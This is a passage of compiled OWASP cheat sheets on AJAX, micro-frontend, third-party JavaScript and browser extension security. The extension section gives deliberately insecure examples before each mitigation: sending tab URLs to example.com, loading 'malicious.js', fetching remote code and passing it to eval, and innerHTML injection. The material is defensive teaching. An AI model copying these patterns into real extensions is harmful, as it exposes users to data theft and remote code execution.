This is hard and even a small mistake can cause large security issues. There are already a lot of frameworks to provide this functionality.

Refer to the [JSON page](https://www.json.org/) for more info.

##### Avoid building XML or JSON dynamically

Just like building HTML or SQL you may cause XML injection bugs, so stay away from this or at least use an encoding library or safe JSON or XML library to make attributes and element data safe.

- [XSS (Cross Site Scripting) Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

##### Never transmit secrets to the client

Anything sent to the client can be read or modified by the user, so keep all that secret stuff on the server please.

##### Choose encryption for the threat model

Use TLS for transport. Client-side encryption can also be appropriate for end-to-end protection or encryption before upload, as described in the [Web Cryptography use cases](https://www.w3.org/TR/webcrypto/#use-cases). Use reviewed protocols and implementations rather than designing a cryptographic protocol yourself. Browser cryptography does not protect plaintext or keys from malicious code running in the application; account for XSS and key management as described in the [Web Cryptography security considerations](https://www.w3.org/TR/webcrypto/#security-considerations).

##### Don't perform security impacting logic on client-side

This principle serves as a fail-safe—if a security decision is ambiguous, perform it on the server.

#### Server-Side

##### Use CSRF Protection

Take a look at the [Cross-Site Request Forgery (CSRF) Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) cheat sheet.

##### Protect against JSON hijacking for older browsers

###### Review AngularJS JSON hijacking defense mechanism

See the [JSON Vulnerability Protection](https://docs.angularjs.org/api/ng/service/$http#json-vulnerability-protection) section of the AngularJS documentation.

###### Always return JSON with an object on the outside

Always have the outside primitive be an object for JSON strings:

**Exploitable:**

```json
[{"object": "inside an array"}]
```

**Not exploitable:**

```json
{"object": "not inside an array"}
```

**Also not exploitable:**

```json
{"result": [{"object": "inside an array"}]}
```

##### Avoid writing serialization code server-side

Remember reference vs. value types; use a reviewed library.

##### Services can be called directly by users

Even though you only expect your AJAX client-side code to call those services, a malicious user can also call them directly.

Validate inputs and treat them as if they are under user control.

##### Avoid building XML or JSON by hand, use the framework

Use the framework to serialize data; building payloads by hand can introduce security issues.

##### Use JSON and XML schema for web services

Use a third-party library to validate web service inputs.

## Micro-Frontend Security

> **Source:** [Micro-Frontend Security](https://cheatsheetseries.owasp.org/cheatsheets/Micro_Frontend_Security_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

Micro-frontends combine independently deployed features in a host application, also called a shell. Separate repositories and deployment teams do not create browser security boundaries: the [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy) separates origins, not individual features within a page.

This cheat sheet covers the security decisions involved in composing these applications:

- Choose which features may share the host's browser privileges.
- Limit communication and data sharing between applications.
- Enforce authorization on the server for every request.
- Control which remote code each host release loads.

For general browser security controls, see the [Web Frontend Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Web_Frontend_Security_Cheat_Sheet.html).

### Choose and Enforce Runtime Boundaries

Document the origin, deployment owner, and required data access of each micro-frontend before choosing a composition mechanism.

| Composition | Security decision |
| --- | --- |
| Remote JavaScript loaded into the host, including Module Federation | Trust the remote with the host page's privileges. A different download origin does not sandbox the executing code. |
| Web Components in the host page | Treat components as part of the same application. Shadow DOM (Document Object Model) and scoped styles do not isolate their scripts from the host. |
| Cross-origin iframe | Use when the feature must be separated from the host's DOM and origin storage. Restrict its capabilities and explicitly control messages crossing the boundary. |
| HTML fragments assembled on a server or at the edge | Review fragments and their scripts as host content. Assembly before delivery does not create a browser isolation boundary. |

#### Isolate Features with Different Trust Levels

Serve a less-trusted feature from a dedicated origin in an iframe. Apply an [iframe sandbox](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe#sandbox), granting only capabilities the feature requires. Leave top-level navigation and popup permissions disabled unless necessary.

Do not combine `allow-scripts` and `allow-same-origin` for content on the host's own origin; that combination can let the embedded application remove its sandbox. `allow-same-origin` preserves the frame's original origin; it does not make a cross-origin frame same-origin with the host.

Without `allow-same-origin`, a sandboxed document has an opaque origin, reported as `"null"` in messages. Do not trust `"null"` as a sender identity. If sensitive messaging requires an identifiable origin, use a dedicated cross-origin frame with a sandbox policy that preserves that origin.

Origin separation limits direct access to the host's DOM and storage. It does not authorize backend requests or make data deliberately sent to the frame confidential from that frame.

#### Control Remote Code and Deployments

For remotes executing in the host page, treat permission to publish a remote as permission to change the host's running application:

- Load only approved HTTPS remote URLs from host-controlled configuration. Do not let query parameters or other untrusted input choose executable code.
- Select immutable, reviewed releases, including entry scripts and their dependent chunks. Keep a known-good release available for rollback.
- Separate deployment credentials for the shell and each remote. This limits direct changes to other deployments, but does not contain a compromised remote already trusted to execute in the shell. See the [CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html).
- Use [Subresource Integrity](https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html#subresource-integrity) where the loader supports it. Verify coverage of dynamically loaded chunks; checking an entry script alone does not verify everything it later loads. Integrity checks detect changed bytes, not malicious behavior in an approved release.
- Apply the host's [Content Security Policy (CSP)](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) to remote loading. A permitted script source is still trusted code; CSP does not isolate one allowed micro-frontend from another.

### Restrict Cross-Application Communication

Apply the general [web messaging guidance](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging) to every host/frame pair: set an exact `targetOrigin`, match `event.origin` exactly, and validate message data. In addition, following the [postMessage security guidance](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns):

- Define a small message contract for each pair. Accept only the message types and payload fields that the receiving feature needs.
- Check `event.source` against the expected frame's `contentWindow` or the expected parent window, not only the origin. Several frames can share one origin.
- Pass the minimum data needed for the operation. Avoid broadcasting credentials or sensitive state to every feature.

These checks identify the sending origin and window, not the current user's permissions. A message requesting a privileged operation must still lead to server-side authorization. They also do not protect against compromised code running inside the expected sender.

A shared in-page event bus has no browser-enforced identity boundary between its participants. Do not use event names or application identifiers as proof of authority.

### Enforce Backend Authorization and Limit Shared Data

#### Authorize Every Request on the Server

Neither the shell nor a remote micro-frontend can enforce authorization in client-side code. Route guards, hidden controls, and client-side role checks only affect presentation and can be bypassed.

Enforce permissions for the requested operation, resource, and tenant on every backend request, regardless of which frontend initiated it. Do not trust a role, tenant identifier, or permission flag supplied by the shell or a remote. Use a shared server-side policy where appropriate so independently developed features apply consistent checks. See the [Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html#validate-the-permissions-on-every-request).

#### Keep Sensitive State Out of Shared Runtimes

Browser storage is [separated by origin](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy#cross-origin_data_storage_access). Storage key prefixes, separate state stores, and component boundaries do not provide security isolation between scripts in the same page. Treat data exposed in the page or origin storage as available to every remote executing there.

Keep session identifiers out of `localStorage` and `sessionStorage`. When using a backend-for-frontend, keep upstream access tokens on the server and use a session cookie configured according to the [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies). An `HttpOnly` cookie prevents JavaScript from reading the cookie, but compromised code in the host can still make authenticated requests. Apply [cross-site request forgery protection](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) to cookie-authenticated operations.

Return only data the authenticated user is authorized to access. Clear shared state and cached responses on logout or tenant changes to avoid displaying stale data. This cleanup does not replace backend tenant checks or protect information already exposed to a compromised remote.

## Third Party JavaScript Management

> **Source:** [Third Party JavaScript Management](https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

Tags, aka marketing tags, analytics tags etc. are small bits of JavaScript on a web page. They can also be HTML image elements when JavaScript is disabled. The reason for them is to collect data on the web user actions and browsing context for use by the web page owner in marketing.

Third party vendor JavaScript tags (hereinafter, **tags**) can be divided into two types:

- User interface tags.
- Analytic tags.

User interface tags have to execute on the client because they change the DOM; displaying a dialog or image or changing text etc.

Analytics tags send information back to a marketing information database; information like what user action was just taken, browser metadata, location information, page metadata etc. The rationale for analytics tags is to provide data from the user's browser DOM to the vendor for some form of marketing analysis. This data can be anything available in the DOM. The data is used for user navigation and clickstream analysis, identification of the user to determine further content to display etc., and various marketing analysis functions.

The term **host** refers to the original site the user goes to, such as a shopping or news site, that contains or retrieves and executes third party JavaScript tag for marketing analysis of the user actions.

### Major risks

The single greatest risk is a compromise of the third party JavaScript server, and the injection of malicious JavaScript into the original tag JavaScript. See [RiskIQ's report of the 2018 Ticketmaster incident](https://www.globenewswire.com/fr/news-release/2018/07/10/1535094/0/en/RiskIQ-Finds-Ticketmaster-Breach-Part-of-Massive-Credit-Card-Skimming-Campaign-Affecting-over-800-e-Commerce-Sites.html).

The invocation of third-party JS code in a web application requires consideration for 3 risks in particular:

1. The loss of control over changes to the client application,
2. The execution of arbitrary code on client systems,
3. The disclosure or leakage of sensitive information to 3rd parties.

#### Risk 1: Loss of control over changes to the client application

This risk arises from the fact that there is usually no guarantee that the code hosted at the third-party will remain the same as seen from the developers and testers: new features may be pushed in the third-party code at any time, thus potentially breaking the interface or data-flows and exposing the availability of your application to its users/customers.

Typical defenses include, but are not restricted to: in-house script mirroring (to prevent alterations by 3rd parties), sub-resource integrity (to enable browser-level interception) and secure transmission of the third-party code (to prevent modifications while in-transit). See below for more details.

#### Risk 2: Execution of arbitrary code on client systems

For original research on vulnerable third-party integrations, see [Randy Westergren's ad-network findings](https://randywestergren.com/widespread-xss-vulnerabilities-ad-network-code-affecting-top-tier-publishers-retailers/).

This risk arises from the fact that third-party JavaScript code is rarely reviewed by the invoking party prior to its integration into a website/application. As the client reaches the hosting website/application, this third-party code gets executed, thus granting the third-party the exact same privileges that were granted to the user (similar to [XSS attacks](https://owasp.org/www-community/attacks/xss/)).

Any testing performed prior to entering production loses some of its validity, including `AST testing` ([IAST](https://www.veracode.com/security/interactive-application-security-testing-iast), [RAST](https://www.veracode.com/sites/default/files/pdf/resources/whitepapers/what-is-rasp.pdf), [SAST](https://www.sqreen.com/web-application-security/what-is-sast), [DAST](https://www.sqreen.com/web-application-security/what-is-dast), etc.).

While it is widely accepted that the probability of having rogue code intentionally injected by the third-party is low, there are still cases of malicious injections in third-party code after the organization's servers were compromised (ex: Yahoo, January 2014).

This risk should therefore still be evaluated, in particular when the third-party does not show any documentation that it is enforcing better security measures than the invoking organization itself, or at least equivalent. Another example is that the domain hosting the third-party JavaScript code expires because the company maintaining it is bankrupt or the developers have abandoned the project. A malicious actor can then re-register the domain and publish malicious code.

Typical defenses include, but are not restricted to:

- In-house script mirroring (to prevent alterations by 3rd parties),
- [Sub-resource integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) (to enable browser-level interception),
- Secure transmission of the third-party code (to prevent modifications while in-transit) and various types of sandboxing. See below for more details.
- ...

#### Risk 3: Disclosure of sensitive information to 3rd parties

[ClearSky's original Magecart investigation](https://www.clearskysec.com/magecart/) documents payment-data theft through injected JavaScript.

When a third-party script is invoked in a website/application, the browser directly contacts the third-party servers. By default, the request includes all regular HTTP headers. In addition to the originating IP address of the browser, the third-party also obtains other data such as the referrer (in non-https requests) and any cookies previously set by the third-party, for example when visiting another organization's website that also invokes the third-party script.

In many cases, this grants the third-party primary access to information on the organization's users / customers / clients. Additionally, if the third-party is sharing the script with other entities, it also collects secondary data from all the other entities, thus knowing who the organization's visitors are but also what other organizations they interact with.

A typical case is the current situation with major news/press sites that invoke third-party code (typically for ad engines, statistics and JavaScript APIs): any user visiting any of these websites also informs the 3rd parties of the visit. In many cases, the third-party also gets to know what news articles each individual user is clicking specifically (leakage occurs through the HTTP referrer field) and thus can establish deeper personality profiles.

Typical defenses include, but are not restricted to: in-house script mirroring (to prevent leakage of HTTP requests to 3rd parties). Users can reduce their profiling by random clicking links on leaking websites/applications (such as press/news websites) to reduce profiling. See below for more details.

### Third-party JavaScript Deployment Architectures

There are three basic deployment mechanisms for **tags**. These mechanisms can be combined with each other.

#### Vendor JavaScript on page

This is where the vendor provides the host with the JavaScript and the host puts it on the host page. To be secure the host company must review the code for any vulnerabilities like [XSS attacks](https://owasp.org/www-community/attacks/xss/) or malicious actions such as sending sensitive data from the DOM to a malicious site. This is often difficult because the JavaScript is commonly obfuscated.

```html
<!-- Some host, e.g. foobar.com, HTML code here -->
<html>
<head></head>
    <body>
        ...
        <script type="text/javascript">/* 3rd party vendor javascript here */</script>
    </body>
</html>
```

#### JavaScript Request to Vendor

This is where one or a few lines of code on the host page each request a JavaScript file or URL directly from the vendor site. When the host page is being created, the developer includes the lines of code provided by the vendor that will request the vendor JavaScript. Each time the page is accessed the requests are made to the vendor site for the JavaScript, which then executes on the user browser.

```html
<!-- Some host, e.g. foobar.com, HTML code here -->`
<html>
    <head></head>
    <body>
        ...
        <!-- 3rd party vendor javascript -->
        <script src="https://analytics.vendor.com/v1.1/script.js"></script>
        <!-- /3rd party vendor javascript -->
    </body>
</html>
```

#### Indirect request to Vendor through Tag Manager

This is where one or a few lines of code on the host page each request a JavaScript file or URL from a tag aggregator or **tag manager** site; not from the JavaScript vendor site. The tag aggregator or tag manager site returns whatever third party JavaScript files that the host company has configured to be returned. Each file or URL request to the tag manager site can return lots of other JavaScript files from multiple vendors.

The actual content that is returned from the aggregator or manager (i.e. the specific JavaScript files as well as exactly what they do) can be dynamically changed by host site employees using a graphical user interface for development, hosted on the tag manager site that non-technical users can work with, such as the marketing part of the business.

The changes can be either:

1. Get a different JavaScript file from the third-party vendor for the same request.
2. Change what DOM object data is read, and when, to send to the vendor.

The tag manager developer user interface will generate code that does what the marketing functionality requires, basically determining what data to get from the browser DOM and when to get it. The tag manager always returns a **container** JavaScript file to the browser which is basically a set of JavaScript functions that are used by the code generated by the user interface to implement the required functionality.

Similar to java frameworks that provide functions and global data to the developer, the container JavaScript executes on the browser and lets the business user use the tag manager developer user interface to specify high level functionality without needing to know JavaScript.

```html
<!-- Some host, e.g. foobar.com, HTML code here -->
 <html>
   <head></head>
     <body>
       ...
       <!-- Tag Manager -->
       <script>(function(w, d, s, l, i){
         w[l] = w[l] || [];
         w[l].push({'tm.start':new Date().getTime(), event:'tm.js'});
         var f = d.getElementsByTagName(s)[0],
         j = d.createElement(s),
         dl = l != 'dataLayer' ? '&l=' + l : '';
         j.async=true;
         j.src='https://tagmanager.com/tm.js?id=' + i + dl;
         f.parentNode.insertBefore(j, f);
       })(window, document, 'script', 'dataLayer', 'TM-FOOBARID');</script>
       <!-- /Tag Manager -->
   </body>
</html>`
```

##### Security Problems with requesting Tags

The previously described mechanisms are difficult to make secure because you can only see the code if you proxy the requests or if you get access to the GUI and see what is configured. The JavaScript is generally obfuscated so even seeing it is usually not useful. It is also instantly deployable because each new page request from a browser executes the requests to the aggregator which gets the JavaScript from the third party vendor. So as soon as any JavaScript files are changed on the vendor, or modified on the aggregator, the next call for them from any browser will get the changed JavaScript. One way to manage this risk is with the *Subresource Integrity* standard described below.

#### Server Direct Data Layer

The tag manager developer user interface can be used to create JavaScript that can get data from anywhere in the browser DOM and store it anywhere on the page. This can allow vulnerabilities because the interface can be used to generate code to get unvalidated data from the DOM (e.g. URL parameters) and store it in some page location that would execute JavaScript.

Use a host-defined data layer to limit the data intended for collection. This agreement does not restrict the privileges of JavaScript executing in the page.

The data layer is either:

1. a DIV object with attribute values that have the marketing or user behavior data that the third-party wants
2. a set of JSON objects with the same data. Each variable or attribute contains the value of some DOM element or the description of a user action. The data layer is the complete set of values that all vendors need for that page. The data layer is created by the host developers.

When specific events happen that the business has defined, a JavaScript handler for that event sends values from the data layer directly to the tag manager server. The tag manager server then sends the data to whatever third party or parties is supposed to get it. The event handler code is created by the host developers using the tag manager developer user interface. The event handler code is loaded from the tag manager servers on every page load.

A data layer is not a sandbox. [Web tag-manager containers can execute custom JavaScript and HTML tags in the browser](https://developers.google.com/tag-platform/learn/sst-fundamentals/2-what-is-sst), so remotely managed event handlers remain part of the page's code trust boundary. Restrict tag-manager publishing access and review changes as application code.

This requires cooperation between the host, the aggregator or tag manager and the vendors.

The host developers have to work with the vendor in order to know what type of data the vendor needs to do their analysis. Then the host programmer determines what DOM element will have that data.

The host developers have to work with the tag manager or aggregator to agree on the protocol to send the data to the aggregator: what URL, parameters, format etc.

The tag manager or aggregator has to work with the vendor to agree on the protocol to send the data to the vendor: what URL, parameters, format etc. Does the vendor have an API?

### Security Defense Considerations

#### Server Direct Data Layer

A server-side collector can filter the data sent to vendors and move eligible tags out of the browser. It does not isolate any scripts that still run in the page.

The data layer can perform any validation of the values, especially values from DOM objects exposed to the user like URL parameters and input fields, if these are required for the marketing analysis.

An example statement for a corporate standard document is 'The tag JavaScript can only access values in the host data layer. The tag JavaScript can never access a URL parameter.

You the host page developer have to agree with the third-party vendors or the tag manager what attribute in the data layer will have what value so they can create the JavaScript to read that value.

User interface tags cannot be made secure using the data layer architecture because their function (or one of their functions) is to change the user interface on the client, not to send data about the user actions.

For analytics that do not need browser execution, send a fixed event schema through a collector you control and run vendor integrations server-side. [Server-side tagging complements rather than replaces client-side collection](https://developers.google.com/tag-platform/learn/sst-fundamentals/2-what-is-sst). Audit the scripts actually loaded before claiming that only first-party code executes.

This is also a very scalable solution. Large ecommerce sites can easily have hundreds of thousands of URL and parameter combinations, with different sets of URLs and parameters being included in different marketing analysis campaigns. The marketing logic could have 30 or 40 different vendor tags on a single page.

For example user actions in pages about specified cities, from specified locations on specified days should send data layer elements 1, 2 and 3. User actions in pages about other cities should send data layer elements 2 and 3 only. Since the event handler code to send data layer data on each page is controlled by the host developers or marketing technologists using the tag manager developer interface, the business logic about when and what data layer elements are sent to the tag manager server, can be changed and deployed in minutes. No interaction is needed with the third parties; they continue getting the data they expect but now it comes from different contexts that the host marketing technologists have chosen.

Changing third party vendors just means changing the data dissemination rules at the tag manager server, no changes are needed in the host code. The data also goes directly only to the tag manager so the execution is fast. The event handler JavaScript does not have to connect to multiple third party sites.

#### Indirect Requests

For indirect requests to tag manager/aggregator sites that offer the GUI to configure the JavaScript, they may also implement:

- Technical controls such as only allowing the JavaScript to access the data layer values, no other DOM element
- Restricting the tag types deployed on a host site, e.g. disabling of custom HTML tags and JavaScript code

The host company should also verify the security practices of the tag manager site such as access controls to the tag configuration for the host company. It also can be two-factor authentication.

Letting the marketing folks decide where to get the data they want can result in XSS because they may get it from a URL parameter and put it into a variable that is in a scriptable location on the page.

#### Sandboxing Content

Both of these tools be used by sites to sandbox/clean DOM data.

- [DOMPurify](https://github.com/cure53/DOMPurify) is a fast, tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks.
- [MentalJS](https://github.com/hackvertor/MentalJS) is a JavaScript parser and sandbox. It allow-lists JavaScript code by adding a "$" suffix to variables and accessors.

#### Subresource Integrity

[Subresource Integrity](https://www.w3.org/TR/SRI/) will ensure that only the code that has been reviewed is executed. The developer generates integrity metadata for the vendor JavaScript, and adds it to the script element like this:

```javascript
<script src="https://analytics.vendor.com/v1.1/script.js"
   integrity="sha384-MBO5IDfYaE6c6Aao94oZrIOiC7CGiSNE64QUbHNPhzk8Xhm0djE6QqTpL0HzTUxk"
   crossorigin="anonymous">
</script>
```

It is important to know that in order for SRI to work, the vendor host needs [CORS](https://www.w3.org/TR/cors/) enabled. Also it is good idea to monitor vendor JavaScript for changes in regular way. Because sometimes you can get **secure** but **not working** third-party code when the vendor decides to update it.

#### Keeping JavaScript libraries updated

[OWASP Top 10:2025 A03 Software Supply Chain Failures](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/) describes the problem of using components with known vulnerabilities. This includes JavaScript libraries. JavaScript libraries must be kept up to date, as previous versions can have known vulnerabilities which can lead to the site typically being vulnerable to [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/). There are several tools out there that can help identify such libraries. One such tool is the free open source tool [RetireJS](https://retirejs.github.io)

#### Sandboxing with iframe

You can also put vendor JavaScript into an iframe from different domain (e.g. static data host). It will work as a "jail" and vendor JavaScript will not have direct access to the host page DOM and cookies.

The host main page and sandbox iframe can communicate between each other via the [postMessage mechanism](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).

Also, iframes can be secured with the iframe [sandbox attribute](http://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/).

For high risk applications, consider the use of [Content Security Policy (CSP)](https://www.w3.org/TR/CSP2/) in addition to iframe sandboxing. CSP makes hardening against XSS even stronger.

```html
<!-- Some host, e.g. somehost.com, HTML code here -->
 <html>
   <head></head>
     <body>
       ...
       <!-- Include iframe with 3rd party vendor javascript -->
       <iframe
       src="https://somehost-static.net/analytics.html"
       sandbox="allow-same-origin allow-scripts">
       </iframe>
   </body>
 </html>

<!-- somehost-static.net/analytics.html -->
 <html>
   <head></head>
     <body>
       ...
       <script>
       window.addEventListener("message", receiveMessage, false);
       function receiveMessage(event) {
         if (event.origin !== "https://somehost.com:443") {
           return;
         } else {
         // Make some DOM here and initialize other
        //data required for 3rd party code
         }
       }
       </script>
       <!-- 3rd party vendor javascript -->
       <script src="https://analytics.vendor.com/v1.1/script.js"></script>
       <!-- /3rd party vendor javascript -->
   </body>
 </html>
```

#### Virtual iframe Containment

This technique creates iFrames that run asynchronously in relation to the main page. It also provides its own containment JavaScript that automates the dynamic implementation of the protected iFrames based on the marketing tag requirements.

#### Vendor Agreements

You can have the agreement or request for proposal with the 3rd parties require evidence that they have implemented secure coding and general corporate server access security. But in particular you need to determine the monitoring and control of their source code in order to prevent and detect malicious changes to that JavaScript.

### MarTechSec

Marketing Technology Security

This refers to all aspects of reducing the risk from marketing JavaScript. Controls include

1. Contractual controls for risk reduction; the contracts with any MarTech company should include a requirement to show evidence of code security and code integrity monitoring.
2. Contractual controls for risk transference: the contracts with any MarTech company could include a penalty for serving malicious JavaScript
3. Technical controls for malicious JavaScript execution prevention; Virtual Iframes,
4. Technical controls for malicious JavaScript identification; [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity).
5. Technical controls including client side JavaScript malicious behavior in penetration testing requirements.

### MarSecOps

Marketing Security Operations

This refers to the operational requirements to maintain some of the technical controls. This involves possible cooperation and information exchange between the marketing team, the martech provider and the run or operations team to update the information in the page controls (SRI hash change, changes in pages with SRI), the policies in the Virtual iFrames, tag manager configuration, data layer changes etc.

The most complete and preventive controls for any site containing non-trivial marketing tags are -

1. A controlled collector and server-side vendor integrations to reduce third-party browser code; a data layer alone does not enforce code isolation.

2. [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity).

3. Virtual frame Containment.

The MarSecOps requirements to implement technical controls at the speed of change that marketing wants or without a significant number of dedicated resources, can make data layer and Subresource Integrity controls impractical.

## Browser Extension Security Vulnerabilities

> **Source:** [Browser Extension Security Vulnerabilities](https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### 1. Permissions Overreach

#### Vulnerability: Permissions Overreach

Browser extensions sometimes request more permissions than they actually need. This can grant them access to all tabs, browsing history, and even sensitive user data. If an extension is compromised, it could lead to serious privacy risks.

#### Example: Permissions Overreach

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "storage"
  ],
  "host_permissions": [
    "http://*/*",
    "https://*/*"
  ]
}
```

#### Mitigation: Permissions Overreach

Follow the Principle of Least Privilege (PoLP) and request only the permissions that are absolutely necessary. Use optional permissions whenever possible instead of granting full access upfront. Regularly audit and remove any permissions that are no longer needed. In Manifest V3, declare URL access separately in [`host_permissions` or `optional_host_permissions`](https://developer.chrome.com/docs/extensions/develop/migrate/manifest#update-host-permissions).

### 2. Data Leakage

#### Vulnerability: Data Leakage

Some extensions unintentionally expose user data by sending browsing activity or personal details to external servers without proper security measures.

#### Example: Data Leakage

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ URL: tab.URL })
    });
  }
});
```

#### Mitigation: Data Leakage

Always use HTTPS for all communications to prevent data interception. Limit data collection and be transparent by clearly stating what data is collected in a Privacy Policy.Implement user consent mechanisms before collecting or sending any personal data.

### 3. Cross-Site Scripting (XSS)

#### Vulnerability: Cross-Site Scripting (XSS)

If user input is not properly sanitized, attackers can inject malicious scripts into web pages, potentially stealing user data or performing unauthorized actions.

#### Example: Cross-Site Scripting (XSS)

```javascript
let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // No sanitization
```

#### Mitigation: Cross-Site Scripting (XSS)

Implement Content Security Policy (CSP) to block inline scripts. Use libraries like DOMPurify to sanitize user input before displaying it. Avoid using innerHTML and instead use textContent to prevent execution of injected scripts.

### 4. Insecure Communication

#### Vulnerability: Insecure Communication

Some extensions send sensitive data over unsecured HTTP connections, making it vulnerable to interception by attackers.

#### Example: Insecure Communication

```javascript
fetch('http://example.com/api/data');
```

#### Mitigation: Insecure Communication

Always use HTTPS for external communications to prevent data theft. Validate server responses before processing them to ensure data integrity.

### 5. Code Injection

#### Vulnerability: Code Injection

An extension that dynamically loads scripts from an untrusted source can be exploited to inject and execute malicious code.

#### Example: Code Injection

```javascript
let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);
```

#### Mitigation: Code Injection

Use CSP (Content Security Policy) to restrict script sources. For more details, refer to the [CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html). Avoid using eval() and innerHTML as they can execute malicious code. Prefer using extension messaging APIs instead of injecting scripts into web pages.

### 6. Malicious Updates

#### Vulnerability: Malicious Updates

If an extension fetches updates from an untrusted server, an attacker could push malicious updates to all users.

#### Example: Malicious Updates

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Unsafe!
});
```

#### Mitigation: Malicious Updates

Sign extension updates with digital signatures to ensure authenticity. Instead of fetching updates within the extension, rely on updates from the extension marketplace.
See ["Don’t inject or incorporate remote scripts"](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices).
Implement integrity checks before executing any fetched code.

### 7. Third-Party Dependencies

#### Vulnerability: Third-Party Dependencies

Using outdated or vulnerable third-party libraries in an extension can introduce security risks if those libraries have known exploits.

#### Example: Third-Party Dependencies

```json
{
  "dependencies": {
    "vulnerable-lib": "1.0.0"
  }
}
```

#### Mitigation: Third-Party Dependencies

Regularly audit third-party dependencies for security vulnerabilities. Use tools like npm audit or OWASP Dependency-Check to detect risks.Prefer actively maintained libraries with frequent security updates.

### 8. Lack of Content Security Policy (CSP)

#### Vulnerability: Lack of Content Security Policy (CSP)

Weakening an extension’s Content Security Policy (CSP) can increase the impact of script injection. [Chrome enforces a default and minimum CSP for Manifest V3 extension pages](https://developer.chrome.com/docs/extensions/reference/manifest/content-security-policy), even when the manifest omits a custom policy.

#### Example: Restrictive Manifest V3 Policy

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "content_security_policy": {
    "extension_pages": "default-src 'self'; script-src 'self'; object-src 'none';"
  }
}
```

#### Mitigation: Lack of Content Security Policy (CSP)

Configure `content_security_policy.extension_pages` in `manifest.json` and load scripts from the extension package. Do not apply ordinary webpage nonce or hash recommendations to Chrome Manifest V3 extension pages: their [allowed script sources are restricted](https://developer.chrome.com/docs/extensions/develop/migrate/improve-security#remove-unsupported-csv). Keep inline script execution blocked and restrict other resource types to those the extension needs.

### 9. Insecure Storage

#### Vulnerability: Insecure Storage

Storing sensitive data like authentication tokens in localStorage or other unsecured locations makes it easy for attackers to access.

#### Example: Insecure Storage

```javascript
localStorage.setItem('token', 'my-secret-token'); // No encryption
```

#### Mitigation: Insecure Storage

Avoid persisting sensitive user data in the extension: [extension storage is not encrypted](https://developer.chrome.com/docs/extensions/develop/security-privacy/user-privacy#data_collection). For sensitive data needed only while the browser is running, use [`chrome.storage.session`](https://developer.chrome.com/docs/extensions/reference/api/storage#storage_areas), which stores data in memory and is not exposed to content scripts by default. Keep that access restriction and clear data when it is no longer needed. This reduces persistence and content-script exposure; it does not protect secrets from a compromised extension or device.
Never hardcode API keys or credentials within the extension code.

### 10. Insufficient Privacy Controls

#### Vulnerability: Insufficient Privacy Controls

If an extension does not clearly define how it collects and handles user data, it could lead to privacy violations and unauthorized data usage.

#### Example: Insufficient Privacy Controls

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "description": "A cool extension with no privacy policy."
}
```

#### Mitigation: Insufficient Privacy Controls

Implement a clear privacy policy that explains data collection practices. Allow users to opt out of data collection. Disclose data-sharing practices to comply with GDPR, CCPA, and other privacy regulations.

### 11. DOM-based Data Skimming

#### Vulnerability: DOM-based Data Skimming

When an extension renders sensitive user information directly into DOM of a web page, this data becomes accessible to the page's own scripts.

This risk applies regardless of the method used, including plain JavaScript DOM manipulation or injecting components built with frameworks like React.

A malicious or compromised web page can inspect the DOM, read the sensitive data (e.g., personally identifiable information, financial details, AI chat histories), and exfiltrate it.

#### Example: DOM-based Data Skimming

```javascript
// content-script.js

// Sensitive data fetched from the extension's background service
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// This injects sensitive data directly into the page's DOM
